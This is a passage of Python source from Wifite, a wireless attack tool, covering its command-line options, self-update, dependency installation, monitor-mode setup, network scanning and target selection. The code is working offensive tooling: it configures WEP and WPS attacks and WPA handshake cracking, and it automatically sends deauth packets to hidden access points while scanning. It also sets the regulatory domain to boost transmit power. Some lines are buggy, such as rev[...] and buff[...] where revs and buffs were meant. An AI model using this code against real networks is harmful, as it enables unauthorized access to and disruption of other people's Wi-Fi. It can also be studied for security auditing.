        wpa_group.add_argument('-wpat', help=argparse.SUPPRESS, action='store', dest='wpat')
        wpa_group.add_argument('--wpadt', metavar='[secs]', help='Time to wait between sending deauth packets (seconds).', action='store',
                               dest='wpadt')
        wpa_group.add_argument('-wpadt', help=argparse.SUPPRESS, action='store', dest='wpadt')
        wpa_group.add_argument('--strip', help='Strip handshake using tshark or pyrit.', default=False,
                               action='store_true', dest='strip')
        wpa_group.add_argument('-strip', help=argparse.SUPPRESS, default=False, action='store_true', dest='strip')
        wpa_group.add_argument('--crack', help='Crack WPA handshakes using [dic] wordlist file.', action='store_true',
                               dest='crack')
        wpa_group.add_argument('-crack', help=argparse.SUPPRESS, action='store_true', dest='crack')
        wpa_group.add_argument('--dict', metavar='[file]', help='Specificy dictionary to use when cracking WPA.', action='store',
                               dest='dic')
        wpa_group.add_argument('--recapture', help='Recapture handshake even if the cap file exists.', default = False, action='store_true',
                               dest='recapture')
        wpa_group.add_argument('-dict', help=argparse.SUPPRESS, action='store', dest='dic')
        wpa_group.add_argument('--aircrack', help='Verify handshake using aircrack.', default=False,
                               action='store_true', dest='aircrack')
        wpa_group.add_argument('-aircrack', help=argparse.SUPPRESS, default=False, action='store_true', dest='aircrack')
        wpa_group.add_argument('--pyrit', help='Verify handshake using pyrit.', default=False, action='store_true',
                               dest='pyrit')
        wpa_group.add_argument('-pyrit', help=argparse.SUPPRESS, default=False, action='store_true', dest='pyrit')
        wpa_group.add_argument('--tshark', help='Verify handshake using tshark.', default=False, action='store_true',
                               dest='tshark')
        wpa_group.add_argument('-tshark', help=argparse.SUPPRESS, default=False, action='store_true', dest='tshark')
        wpa_group.add_argument('--cowpatty', help='Verify handshake using cowpatty.', default=False,
                               action='store_true', dest='cowpatty')
        wpa_group.add_argument('-cowpatty', help=argparse.SUPPRESS, default=False, action='store_true', dest='cowpatty')
        # set WEP commands
        wep_group = option_parser.add_argument_group('WEP')
        wep_group.add_argument('--wep', help='Only show WEP networks in scanning state (equivalent to "--show wep").', default=False, action='store_true',
                               dest='wep')
        wep_group.add_argument('-wep',help=argparse.SUPPRESS, default=False, action='store_true', dest='wep')
        
        wep_group.add_argument('--pps', metavar='[N]' , type=int, help='Set the number of packets per second to inject.', action='store',
                               dest='pps')
        wep_group.add_argument('-pps', type=int, help=argparse.SUPPRESS, action='store', dest='pps')
        
        wep_group.add_argument('--wept', metavar='[secs]', type=int, help='Sec to wait for each attack, 0 implies endless.', action='store',
                               dest='wept')
        wep_group.add_argument('-wept', type=int, help=argparse.SUPPRESS, action='store', dest='wept')
        
        wep_group.add_argument('--chopchop', help='Use chopchop attack.', default=False, action='store_true',
                               dest='chopchop')
        wep_group.add_argument('-chopchop', help=argparse.SUPPRESS, default=False, action='store_true', dest='chopchop')
        wep_group.add_argument('--arpreplay', help='Use arpreplay attack.', default=False, action='store_true',
                               dest='arpreplay')
        wep_group.add_argument('-arpreplay', help=argparse.SUPPRESS, default=False, action='store_true',
                               dest='arpreplay')
        wep_group.add_argument('--fragment', help='Use fragmentation attack.', default=False, action='store_true',
                               dest='fragment')
        wep_group.add_argument('-fragment', help=argparse.SUPPRESS, default=False, action='store_true', dest='fragment')
        wep_group.add_argument('--caffelatte', help='Use caffe-latte attack.', default=False, action='store_true',
                               dest='caffeelatte')
        wep_group.add_argument('-caffelatte', help=argparse.SUPPRESS, default=False, action='store_true',
                               dest='caffeelatte')
        wep_group.add_argument('--p0841', help='Use P0842 attack.', default=False, action='store_true', dest='p0841')
        wep_group.add_argument('-p0841', help=argparse.SUPPRESS, default=False, action='store_true', dest='p0841')
        wep_group.add_argument('--hirte', help='Use hirte attack.', default=False, action='store_true', dest='hirte')
        wep_group.add_argument('-hirte', help=argparse.SUPPRESS, default=False, action='store_true', dest='hirte')
        wep_group.add_argument('--nofakeauth', help='Stop attack if fake authentication fails.', default=False,
                               action='store_true', dest='fakeauth')
        wep_group.add_argument('-nofakeauth', help=argparse.SUPPRESS, default=False, action='store_true',
                               dest='fakeauth')
        wep_group.add_argument('--wepca', metavar='[N]', type=int, help='Start cracking when number of IVs surpass [n].', action='store',
                               dest='wepca')
        wep_group.add_argument('-wepca', type=int, help=argparse.SUPPRESS, default=False, action='store', dest='wepca')
        wep_group.add_argument('--wepsave', help='Save a copy of .cap files to this directory.', 
                               action='store_true', dest='wepsave')
        wep_group.add_argument('-wepsave', help=argparse.SUPPRESS, default=False, action='store_true', dest='wepsave')
        # set WPS commands
        wps_group = option_parser.add_argument_group('WPS')
        wps_group.add_argument('--wps', help='Only show WPS networks in scanning state (equivalent to "--show wps --nowpa").', default=False, action='store_true',
                               dest='wps')
        wps_group.add_argument('--nowps', help='Disable WPS PIN Attack.', action='store_true',
                               dest='nowps')
        
        wps_group.add_argument('-wps', help=argparse.SUPPRESS, default=False, action='store_true', dest='wps')
        wps_group.add_argument('--wpst', metavar='[secs]', type=int, help='Max wait for new retry before giving up (0: never).', action='store',
                               dest='wpst')
        wps_group.add_argument('-wpst', type=int, help=argparse.SUPPRESS, action='store', dest='wpst')
        wps_group.add_argument('--wpsratio', type=float, metavar='[ratio]', help='Min ratio of successful PIN attempts/total retries.', action='store',
                               dest='wpsratio')
        wps_group.add_argument('-wpsratio', type=float, help=argparse.SUPPRESS, action='store', dest='wpsratio')
        wps_group.add_argument('--wpsretry', metavar='[N]' , type=int, help='Max number of retries for same PIN before giving up.',
                               action='store', dest='wpsretry')
        wps_group.add_argument('-wpsretry', type=int,help=argparse.SUPPRESS, action='store', dest='wpsretry')
        wps_group.add_argument('--wpssave', help='Save progress of WPS PIN attack to "wps" subfolder in current folder.',
                               default=False, action='store_true', dest='wpssave')
        others_group = option_parser.add_argument_group('OTHERS')
        others_group.add_argument('--update', help='Check and update Wifite.', default=False, action='store_true',
                                  dest='update')
        others_group.add_argument('-update', help=argparse.SUPPRESS, default=False, action='store_true', dest='update')
        others_group.add_argument('--debug', help='Print lots of debug information.', action='store_true', dest='debug')
        
        
        return option_parser

    def update(self):
        """
            Checks for new version, prompts to update, then
            replaces this script with the latest from the repo
        """
        buffs=[]
        revs=[]
        try:
            println_warning('updating requires an ' + G + 'internet connection' + W)
            
            for url in UPDATE_URLS:
                println_info('checking for latest version from "%s"...' % (G + url + W))
                buff=get_file(url)

                if buff == False:
                    println_error('unable to access update url')
                else:

                    rev=get_revision(buff)
                    if rev != -1:
                        println_info('revision %s%d%s found!' % (G, rev, W))
                        buffs.append(buff)
                        revs.append(rev)

            latest_rev_index=-1
            for i,rev in enumerate(revs):
                if rev > self.REVISION:
                    if latest_rev_index == -1  or (latest_rev_index != -1 and rev > latest_rev_index):
                        latest_rev_index = i
            if latest_rev_index != -1:        
                print GR + ' [!]' + W + ' a new version is ' + G + 'available!' + W
                print GR + ' [-]' + W + '   revision:    ' + G + str(rev[latest_rev_index]) + W
                response = raw_input(GR + ' [+]' + W + ' do you want to update to the latest version? (y/n): ')
                if not response.lower().startswith('y'):
                    print GR + ' [-]' + W + ' upgrading ' + O + 'aborted' + W
                    self.exit_gracefully(0)
                    return
                # Download script, replace with this one
                print GR + ' [+] ' + G + 'upgrading...' + W
                do_update(buff[latest_rev_index])

            else:
                if(len(buffs)):
                    println_info('your copy of wifite is ' + G + 'up to date' + W)
                else:
                    println_warning('Unable to access any update sites.')

        except KeyboardInterrupt:
            print R + '\n (^C)' + O + ' wifite update interrupted' + W
        self.exit_gracefully(0)


class RunEngine:
    def __init__(self, run_config):
        self.RUN_CONFIG = run_config
        self.RUN_CONFIG.RUN_ENGINE = self

    def programs_check(self):
        """
            Ensures required programs are installed.
        """
        programs=[
            { 'name':'aircrack-ng', 'url': 'http://www.aircrack-ng.org', 'install':['sudo','apt-get','install','aircrack-ng'], 'files': ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng', 'packetforge-ng'], 'critical': True },
            { 'name':'iw', 'url': '','install':'apt-get install aircrack-ng','install':['sudo','apt-get','install','iw'], 'files': ['iw'], 'critical': True },
            { 'name':'reaver', 'url': 'http://code.google.com/p/reaver-wps','install':['sudo','apt-get','install','reaver'], 'files': ['reaver',['walsh','wash']], 'critical': True },
            { 'name':'cowpatty', 'url': 'http://sf.net/cowpatty', 'install':['sudo','apt-get','install','cowpatty'], 'files': ['cowpatty'], 'critical': False},
            { 'name':'pyrit', 'url': 'http://code.google.com/p/pyrit', 'install':['sudo','apt-get','install','pyrit'], 'files': ['pyrit'], 'critical': False },
            { 'name':'tshark', 'url':'http://www.wireshark.org', 'install':['sudo','apt-get','install','wireshark'], 'files': ['cowpatty'], 'critical': False }]
        incomplete=[]
        for program in programs:
            not_found=[]
            message = ''
            for f in program['files']:
                if isinstance(f,list):
                    found=False
                    for p in f:
                        println_debug("checking " + p)
                        if file_search(p):
                            found=True
                    if not found:
                        not_found+=f
                else:
                    if not file_search(f):
                        not_found.append(f)
            if len(not_found):
                incomplete.append(program)
                message='program "%s"' % ("\",\"".join(not_found))
                if not program['name'] in program['files']:
                        ' from "%s" suite'
                message += ' cannot be found!'
                if program['url'] != '':
                    message += ' You may obtain it from "%s".' % (G + program['url'] + O)
                
                if program['critical']:
                    message = 'critical ' + message
                    println_error(message)
                else:
                    println_warning(message)
                
                if len(program['install']):
                    response = raw_input(GR + ' [+]' + W + ' do you want to install it now? (y/n): ')
                    if response.lower().startswith('y'):
                        result=call(program['install'])

                        if program['critical'] and result != 0:
                            return False
                    else:
                        if program['critical']:
                            return False
                            
                else:
                    if program['critical']:
                        return False
                        #self.RUN_CONFIG.exit_gracefully(1)
        return True
        # printed = False
        # # Check reaver
        # if not file_search('reaver'):
        #     printed = True
        #     println_error('the program ' + R + 'reaver' + O + ' is required for WPS attacks')
        #     print R + '    ' + O + '   available at ' + C + 'http://code.google.com/p/reaver-wps' + W
        #     self.RUN_CONFIG.WPS_ATTACK_DISABLE = True
        # elif not file_search('walsh') and not file_search('wash'):
        #     printed = True
        #     println_error('reaver\'s scanning tool ' + R + 'walsh' + O + ' (or ' + R + 'wash' + O + ') was not found')
        #     println_error('please re-install reaver or install walsh/wash separately')

        # Check handshake-checking apps

    def enable_monitor_mode(self, iface):
        """
            First attempts to anonymize the MAC if requested; MACs cannot
            be anonymized if they're already in monitor mode.
            Uses airmon-ng to put a device into Monitor Mode.
            Then uses the get_iface() method to retrieve the new interface's name.
            Sets global variable IFACE_TO_TAKE_DOWN as well.
            Returns the name of the interface in monitor mode.
        """
        # wlan=Interface(iface)
        # if not self.RUN_CONFIG.DO_NOT_CHANGE_MAC:
        #     wlan.randomize_mac()
        # mon=wlan.enable_monitor_mode()
        # self.RUN_CONFIG.IFACE_TO_TAKE_DOWN=mon
        # return self.RUN_CONFIG.IFACE_TO_TAKE_DOWN

        mac_anonymize(iface)
        print_info('enabling monitor mode on %s...' % (G + iface + W))
        stdout.flush()
        call(['airmon-ng', 'start', iface], stdout=DN, stderr=DN)
        print 'done'
        self.RUN_CONFIG.WIRELESS_IFACE = ''  # remove this reference as we've started its monitoring counterpart
        self.RUN_CONFIG.IFACE_TO_TAKE_DOWN = self.get_iface()
        if self.RUN_CONFIG.TX_POWER > 0:
            print_info('setting Tx power to %s%s%s...' % (G, self.RUN_CONFIG.TX_POWER, W))
            call(['iw', 'reg', 'set', 'BO'], stdout=OUTLOG, stderr=ERRLOG)
            call(['iwconfig', iface, 'txpower', self.RUN_CONFIG.TX_POWER], stdout=OUTLOG, stderr=ERRLOG)
            print 'done'
        return self.RUN_CONFIG.IFACE_TO_TAKE_DOWN

    def disable_monitor_mode(self):
        """
            The program may have enabled monitor mode on a wireless interface.
            We want to disable this before we exit, so we will do that.
        """
        if self.RUN_CONFIG.IFACE_TO_TAKE_DOWN == '': return
        print GR + ' [+]' + W + ' disabling monitor mode on %s...' % (G + self.RUN_CONFIG.IFACE_TO_TAKE_DOWN + W),
        stdout.flush()
        call(['airmon-ng', 'stop', self.RUN_CONFIG.IFACE_TO_TAKE_DOWN], stdout=DN, stderr=DN)
        print 'done'

    def rtl8187_fix(self, iface):
        """
            Attempts to solve "Unknown error 132" common with RTL8187 devices.
            Puts down interface, unloads/reloads driver module, then puts iface back up.
            Returns True if fix was attempted, False otherwise.
        """
        # Check if current interface is using the RTL8187 chipset
        proc_airmon = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)
        proc_airmon.wait()
        using_rtl8187 = False
        for line in proc_airmon.communicate()[0].split():
            line = line.upper()
            if line.strip() == '' or line.startswith('INTERFACE'): continue
            if line.find(iface.upper()) and line.find('RTL8187') != -1: using_rtl8187 = True

        if not using_rtl8187:
            # Display error message and exit
            println_error('unable to generate airodump-ng CSV file')
            println_error('you may want to disconnect/reconnect your wifi device')
            self.RUN_CONFIG.exit_gracefully(1)

        println_warning("attempting " + O + "RTL8187 'Unknown Error 132'" + W + " fix...")

        original_iface = iface
        # Take device out of monitor mode
        airmon = Popen(['airmon-ng', 'stop', iface], stdout=PIPE, stderr=DN)
        airmon.wait()
        for line in airmon.communicate()[0].split('\n'):
            if line.strip() == '' or \
                    line.startswith("Interface") or \
                            line.find('(removed)') != -1:
                continue
            original_iface = line.split()[0]  # line[:line.find('\t')]

        # Remove drive modules, block/unblock ifaces, probe new modules.
        print_and_exec(['ifconfig', original_iface, 'down'])
        print_and_exec(['rmmod', 'rtl8187'])
        print_and_exec(['rfkill', 'block', 'all'])
        print_and_exec(['rfkill', 'unblock', 'all'])
        print_and_exec(['modprobe', 'rtl8187'])
        print_and_exec(['ifconfig', original_iface, 'up'])
        print_and_exec(['airmon-ng', 'start', original_iface])

        print '\r                                                        \r',
        println_warning('restarting scan...\n')

        return True
    def list_iface(self):
        proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
        iface = ''
        monitors = []
        adapters = []
        for line in proc.communicate()[0].split('\n'):
            if len(line) == 0: continue
            if ord(line[0]) != 32:  # Doesn't start with space
                iface = line[:line.find(' ')]  # is the interface
            if line.find('Mode:Monitor') != -1:
                monitors.append(iface)
            else:
                adapters.append(iface)
        return (monitors, adapters)
    def get_iface(self):
        """
            Get the wireless interface in monitor mode.
            Defaults to only device in monitor mode if found.
            Otherwise, enumerates list of possible wifi devices
            and asks user to select one to put into monitor mode (if multiple).
            Uses airmon-ng to put device in monitor mode if needed.
            Returns the name (string) of the interface chosen in monitor mode.
        """
        if not self.RUN_CONFIG.PRINTED_SCANNING:
            println_info('scanning for wireless devices...')
            self.RUN_CONFIG.PRINTED_SCANNING = True

        (monitors, adapters) = self.list_iface()

        if self.RUN_CONFIG.WIRELESS_IFACE != '':
            if monitors.count(self.RUN_CONFIG.WIRELESS_IFACE):
                return self.RUN_CONFIG.WIRELESS_IFACE
            else:
                if self.RUN_CONFIG.WIRELESS_IFACE in adapters:
                    # valid adapter, enable monitor mode
                    println_error('could not find wireless interface %s in monitor mode' % (
                    R + '"' + R + self.RUN_CONFIG.WIRELESS_IFACE + '"' + O))
                    return self.enable_monitor_mode(self.RUN_CONFIG.WIRELESS_IFACE)
                else:
                    # couldnt find the requested adapter
                    println_error('could not find wireless interface %s' % (
                    '"' + R + self.RUN_CONFIG.WIRELESS_IFACE + O + '"' + W))
                    self.RUN_CONFIG.exit_gracefully(0)

        if len(monitors) == 1:
            return monitors[0]  # Default to only device in monitor mode
        elif len(monitors) > 1:
            println_info("interfaces in " + G + "monitor mode:" + W)
            for i, monitor in enumerate(monitors):
                print "  %s. %s" % (G + str(i + 1) + W, G + monitor + W)
            ri = raw_input("%s [+]%s select %snumber%s of interface to use for capturing (%s1-%d%s): %s" % \
                           (GR, W, G, W, G, len(monitors), W, G))
            while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
                ri = raw_input("%s [+]%s select number of interface to use for capturing (%s1-%d%s): %s" % \
                               (GR, W, G, len(monitors), W, G))
            i = int(ri)
            return monitors[i - 1]

        proc = Popen(['airmon-ng'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].split('\n'):
            if len(line) == 0 or line.startswith('Interface'): continue
            monitors.append(line)

        if len(monitors) == 0:
            println_error("no wireless interfaces were found." + W)
            println_error("you need to plug in a wifi device or install drivers.\n" + W)
            self.RUN_CONFIG.exit_gracefully(0)
        elif self.RUN_CONFIG.WIRELESS_IFACE != '' and monitors.count(self.RUN_CONFIG.WIRELESS_IFACE) > 0:
            monitor = monitors[0][:monitors[0].find('\t')]
            return self.enable_monitor_mode(monitor)

        elif len(monitors) == 1:
            monitor = monitors[0][:monitors[0].find('\t')]
            return self.enable_monitor_mode(monitor)

        println_info("available wireless devices:")
        for i, monitor in enumerate(monitors):
            print "  %s%d%s. %s" % (G, i + 1, W, monitor)

        ri = raw_input(
            GR + " [+]" + W + " select number of device to put into monitor mode (%s1-%d%s): " % (G, len(monitors), W))
        while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
            ri = raw_input(" [+] select number of device to put into monitor mode (%s1-%d%s): " % (G, len(monitors), W))
        i = int(ri)
        monitor = monitors[i - 1][:monitors[i - 1].find('\t')]

        return self.enable_monitor_mode(monitor)

    def scan(self, channel=0, iface='', tried_rtl8187_fix=False):
        """
            Scans for access points. Asks user to select target(s).
                "channel" - the channel to scan on, 0 scans all channels.
                "iface"   - the interface to scan on. must be a real interface.
                "tried_rtl8187_fix" - We have already attempted to fix "Unknown error 132"
            Returns list of selected targets and list of clients.
        """
        if self.RUN_CONFIG.SCAN_FILE_LOAD == "":
            remove_airodump_files(self.RUN_CONFIG.temp + 'wifite')

            command = ['airodump-ng',
                       '-a',  # only show associated clients
                       '-w', self.RUN_CONFIG.temp + 'wifite']  # output file
            if channel != 0:
                command.append('-c')
                command.append(str(channel))
            command.append(iface)

            proc = Popen(command, stdout=DN, stderr=DN)

            time_started = time.time()
            println_info('initializing scan' + W + ' (' + G + iface + W + '), updates at 5 sec intervals, ' + G + 'CTRL+C' + W + ' when ready.')
            (targets, clients) = ([], [])
            try:
                deauth_sent_targets = []
                deauth_sent_targets_time=[]
                last_print_time=time.time()
                old_targets = []

                stop_scanning = False
                while True:
                    time.sleep(0.3)
                    force_print = False
                    cracked_targets=[]
                    num_of_filtered_targets=0
                    messages=[]
                    if not os.path.exists(self.RUN_CONFIG.temp + 'wifite-01.csv') and time.time() - time_started > 1.0:
                        println_error('ERROR!')
                        # RTL8187 Unknown Error 132 FIX
                        if proc.poll() is not None:  # Check if process has finished
                            proc = Popen(['airodump-ng', iface], stdout=DN, stderr=PIPE)
                            if not tried_rtl8187_fix and proc.communicate()[1].find('failed: Unknown error 132') != -1:
                                send_interrupt(proc)
                                if self.rtl8187_fix(iface):
                                    return self.scan(channel=channel, iface=iface, tried_rtl8187_fix=True)
                        println_error('unable to generate airodump-ng output files')
                        println_error('you may want to disconnect/reconnect your wifi device')
                        self.RUN_CONFIG.exit_gracefully(1)
            
                    println_debug("Parsing CSV...")
                    (targets, clients) = self.parse_csv(self.RUN_CONFIG.temp + 'wifite-01.csv')
                    
                    total_targets=len(targets)
                    
                    if self.RUN_CONFIG.SHOW_TARGET != "":
                        targets=self.filter_targets(targets,clients,self.RUN_CONFIG.SHOW_TARGET)
                        if(len(targets) != total_targets):
                            num_of_filtered_targets=total_targets - len(targets)
                        #messages.append( GR + ' [+]' + W + ' %s targets removed from %s targets by show filter %s, %s remain' % \
                        #                              (G + str(total_targets - len(targets)) + W, G + str(total_targets) + W,
                        #                               G + self.RUN_CONFIG.SHOW_TARGET + W, G + str(len(targets))+ W))
                    

                    # Remove any already cracked networks if configured to do so
                    println_debug("Checking and removing cracked from %d found targets" % len(targets))
                    if self.RUN_CONFIG.SHOW_ALREADY_CRACKED == False:
                        for target in targets:
                            for cracked in self.RUN_CONFIG.CRACKED_TARGETS:
                                if target.ssid.lower() == cracked.ssid.lower() and target.bssid.lower() == cracked.bssid.lower():
                                    cracked_targets.append(target)
                                    targets.remove(target)
                                    #println_debug(cracked.ssid + " removed!")
                        
                        #if(len(targets) != total_targets):
                        #    messages.append( GR + ' [+]' + W + ' %s cracked targets removed from %s targets, %s remain' % \
                        #                             (G + str(total_targets - len(targets)) + W, G + str(total_targets) + W,
                        #                              G + str(len(targets)) + W))
                    # If we are targeting a specific ESSID/BSSID, skip the scan once we find it.
                    println_debug("Checking target SSID...")
                    if self.RUN_CONFIG.TARGET_ESSID != '':
                        for t in targets:
                            if t.ssid.lower() == self.RUN_CONFIG.TARGET_ESSID.lower():
                                send_interrupt(proc)
                                try:
                                    os.kill(proc.pid, SIGTERM)
                                except OSError:
                                    pass
                                except UnboundLocalError:
                                    pass
                                targets = [t]
                                stop_scanning = True
                                break

                    println_debug("Checking target BSSID...")
                    if self.RUN_CONFIG.TARGET_BSSID != '':
                        for t in targets:
                            if t.bssid.lower() == self.RUN_CONFIG.TARGET_BSSID.lower():
                                send_interrupt(proc)
                                try:
                                    os.kill(proc.pid, SIGTERM)
                                except OSError:
                                    pass
                                except UnboundLocalError:
                                    pass
                                targets = [t]
                                stop_scanning = True
                                break

                    # If user has chosen to target all access points, wait 20 seconds, then return all
                    #if self.RUN_CONFIG.ATTACK_ALL_TARGETS and time.time() - time_started > 10:
                    #    print GR + '\n [+]' + W + ' auto-targeted %s%d%s access point%s' % (
                    #    G, len(targets), W, '' if len(targets) == 1 else 's')
                    #    stop_scanning = True
                    '''
                    if self.RUN_CONFIG.ATTACK_MIN_POWER > 0 and time.time() - time_started > 10:
                        # Remove targets with power < threshold
                        i = 0
                        before_count = len(targets)
                        while i < len(targets):
                            if targets[i].power < self.RUN_CONFIG.ATTACK_MIN_POWER:
                                targets.pop(i)
                            else:
                                i += 1
                        print GR + '\n [+]' + W + ' removed %s targets with power < %ddB, %s remain' % \
                                                  (G + str(before_count - len(targets)) + W,
                                                   self.RUN_CONFIG.ATTACK_MIN_POWER, G + str(len(targets)))
                        stop_scanning = True
                    '''
                    '''
                    if time.time() - time_started > 20 or stop_scanning == True:
                        index = 0
                        before_count=len(targets)
                        while index < len(targets):
                            keep=False
                            for c in clients:
                                    if targets[index].encryption.find("WPA") == -1:
                                            keep=True
                                            break
                                    if c.station == targets[index].bssid:
                                            keep=True
                                            break
                            if keep==False:
                                    targets.pop(index)
                                    index-=1
                            index+=1
                        print GR + '\n [+]' + W + ' removed %s targets without client, %s remain' % \
                                                      (G + str(before_count - len(targets)) + W,
                                                       G + str(len(targets)))
                    '''

                    if stop_scanning: break
                    println_debug('Checking unknwon SSIDs...\n')
                    #print vars(targets)
                    
                    # If there are unknown SSIDs, send deauths to them.
                    #if time.time() - deauth_sent > 5: # channel != 0 and
                        #deauth_sent = time.time()
                    #'''    
                    targets=self.add_known_ssid(targets)
                    for target in targets:
                        if target.ssid == '':
                            println_debug("target has blank ssid: " + target.bssid)
                            deauth=True
                            #Remove expired records
                            for i,deauth_sent_target in enumerate(deauth_sent_targets):
                                if time.time() - deauth_sent_targets_time[i] > self.RUN_CONFIG.SCAN_DEAUTH_TIMEOUT:
                                    println_debug(deauth_sent_target.ssid + " " + deauth_sent_target.bssid + " removed!")
                                    deauth_sent_targets.remove(deauth_sent_target)
                                    deauth_sent_targets_time.remove(deauth_sent_targets_time[i])
                                     
                                    #continue
                            #Check if target has been deauthed recently
                            for i,deauth_sent_target in enumerate(deauth_sent_targets):
                                if deauth_sent_target.bssid == target.bssid:
                                    println_debug("skipped: " + deauth_sent_target.ssid + " " + deauth_sent_target.bssid)
                                    deauth=False
                                    break

                            if deauth:
                                println_debug("deauthing %s (%s)" % (target.ssid, target.bssid))
                                messages +=self.deauth(target,clients,time_started,iface)
                                deauth_sent_targets.append(target)
                                deauth_sent_targets_time.append(time.time())
                                
                                #time.sleep(0.5)
                        else:
                            for ot in old_targets:
                                if ot.ssid == '' and ot.bssid == target.bssid:
                                    messages.append( ' [!] %s successfully decloaked "%s" (%s)' % \
                                          (GR + sec_to_hms(time.time() - time_started) + W, G + target.ssid + W, G + target.bssid))
                                    #Save decloaked result
                                    RUN_CONFIG.save_decloaked(target)
                                    force_print = True
                    time.sleep(2)
                    println_debug ('Checking WPS...\n')
                    if len(targets) > 0:
                        if not self.RUN_CONFIG.WPS_CHECK_DISABLE:
                            wps_check_targets(targets, self.RUN_CONFIG.temp + 'wifite-01.cap', False) #self.RUN_CONFIG.VERBOSE_APS)
                    
                    println_debug('Checking if should print... %s %d %d %d' % (str(force_print), len(old_targets), len(targets),time.time() - last_print_time ))
                    if force_print or len(old_targets) != len(targets) or time.time() - last_print_time > 5 :
                        os.system('clear')    
                        targets = sorted(targets, key=lambda t: t.power, reverse=True)
                        self.print_targets(targets, clients, self.RUN_CONFIG.SCAN_MAX_ROW_SHOW, self.RUN_CONFIG.COLUMN,self.RUN_CONFIG.SPACING)
                          
                        print(' %s %s wireless networks. %s target%s and %s client%s found. %s %s' % (
                            GR + sec_to_hms(time.time() - time_started) + W, G + 'scanning' + W,
                            G + str(len(targets)) + W, '' if len(targets) == 1 else 's',
                            G + str(len(clients)) + W, '' if len(clients) == 1 else 's',
                            '' if len(cracked_targets) == 0 else '(' + G + str(len(cracked_targets)) + W + ' cracked targets removed)',
                            '' if num_of_filtered_targets == 0 else '(' + G + str(num_of_filtered_targets) + W + ' targets filtered)'
                            ))

                        print "\n".join(messages)
                        last_print_time=time.time()
                    else:
                        if len(messages):
                            print "\n".join(messages)
                    #println_debug('%s Time passed... %s %s %s' % (GR + sec_to_hms(time.time() - time_started) + W, str(len(targets)),str(len(clients)),str(self.RUN_CONFIG.SCAN_TIMEOUT)))
                    stdout.flush()
                    old_targets = targets[:] 
                    println_debug('Checking if timeout...')
                    if self.is_timeout(time_started, targets, clients, True):
                        break

            except KeyboardInterrupt:
                #print "KeyboardInterrupt"
                pass
            # except:
            #     print "Unknown error: " + vars(sys.exec_info())
            #     raise
            print ''

            send_interrupt(proc)
            try:
                os.kill(proc.pid, SIGTERM)
            except OSError:
                pass
            except UnboundLocalError:
                pass

            # Use "wash" program to check for WPS compatibility
            if not self.RUN_CONFIG.WPS_CHECK_DISABLE and not self.RUN_CONFIG.SCAN_FILE_LOAD:
                wps_check_targets(targets, self.RUN_CONFIG.temp + 'wifite-01.cap')

            if self.RUN_CONFIG.SCAN_FILE_SAVE != "":
                copy(self.RUN_CONFIG.temp + 'wifite-01.csv', self.RUN_CONFIG.SCAN_FILE_SAVE) #time.strftime("%Y-%m-%d %H %M %S")

            remove_airodump_files(self.RUN_CONFIG.temp + 'wifite')
        else:
            println_info("opening AP file " +self.RUN_CONFIG.SCAN_FILE_LOAD)
            (targets, clients) = self.parse_csv(self.RUN_CONFIG.SCAN_FILE_LOAD)
            targets=self.add_known_ssid(targets)
        # if stop_scanning:
        #     return (targets, clients)

        print ''
    
        if len(targets) == 0:
            println_error('no targets found!')
            println_error('you may need to wait for targets to show up.')
            print ''
            self.RUN_CONFIG.exit_gracefully(1)

        if self.RUN_CONFIG.VERBOSE_APS: os.system('clear')

        # Sort by Power
        targets = sorted(targets, key=lambda t: t.power, reverse=True)

        #victims = []
        if self.RUN_CONFIG.SHOW_TARGET != "":
            targets=self.filter_targets(targets,clients,self.RUN_CONFIG.SHOW_TARGET)
        self.print_targets(targets, clients, self.RUN_CONFIG.SCAN_MAX_ROW_SHOW, self.RUN_CONFIG.COLUMN,self.RUN_CONFIG.SPACING)
        if(self.RUN_CONFIG.ATTACK_TARGET == ""):
            ri = raw_input((GR + "\n [+]" + W + " enter " + G + "target numbers" + W + " (" + G + "1-%s" + W + ")") % (str(len(targets))) + \
            (" separated by commas, range (e.g.'" + G + "1-2" + W + "'), or wildcards: %s, ") % (G + 'c[num/range]' + W + ' for channel, ' + G + 'p[>=,>,=,<,<=][num]' + W + ' for power, ' + G + 'wep' + W + ', ' + G + 'wep[num of client]' + W + ' or ' + G + 'wep+' + W + " with client, " + G + 'wpa' + W + ' (same syntax as wep), ' + G + 'wps[0,1]' + W + '(0=no, 1=yes), ' + G + 'e[SSID][+]' +W +', ' + G + 'b[BSSID][+]' + W + ' or ' + G + 'all' + W) + \
            "blank input = " + G + "all" + W + ", add " + G + '-' + W + " before to remove:" )
        else:
            ri=self.RUN_CONFIG.ATTACK_TARGET
        victims=self.filter_targets(targets, clients, ri)

        if len(victims) == 0:
            println_warning('no targets selected.' + W)
            self.RUN_CONFIG.exit_gracefully(0)

        print ''
        println_info('%s%d%s target%s selected.' % (G, len(victims), W, '' if len(victims) == 1 else 's'))

        return (victims, clients)
    def deauth(self, target, clients, time_started, iface, wait = False):
        cmd = ['aireplay-ng',
               '--ignore-negative-one',
               '--deauth', str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),
               '-a', target.bssid]
        associated_clients=target.find_clients(clients)
        messages=[]
        if len(associated_clients):
            bssid=associated_clients[random.randint(0, len(associated_clients)-1)].bssid
            cmd.append('-c')
            cmd.append(bssid)
            messages.append(G + ' [!] ' + W + "%s deauthing hidden access point (%s) with client (%s)" % \
            (GR + sec_to_hms(time.time() - time_started) + W, G + target.bssid + W, G + bssid + W  ))
            #print G + ' [!] ' + W + "%s deauthing hidden access point (%s) with client (%s)" % \
            #(GR + sec_to_hms(time.time() - time_started) + W, G + t.bssid) + W, G + bssid + W  
        else:
            messages.append(G + ' [!] ' + W + "%s deauthing hidden access point (%s) with no client" % \
            (GR + sec_to_hms(time.time() - time_started) + W, G + target.bssid + W))
            #print G + ' [!] ' + W + "%s deauthing hidden access point (%s) with no client" % \
            #(GR + sec_to_hms(time.time() - time_started) + W, G + t.bssid + W)
        cmd.append(iface)

        proc_aireplay=Popen(cmd, stdout=DN, stderr=DN)
        if wait:
            proc_aireplay.wait()
        return messages                           
    def add_known_ssid(self,targets):
        for i,t in enumerate(targets):
                if targets[i].ssid == '':
                    for d in self.RUN_CONFIG.DECLOAKED_TARGETS:
                        if targets[i].bssid == d.bssid:
                            targets[i].ssid=d.ssid
                            break
        return targets
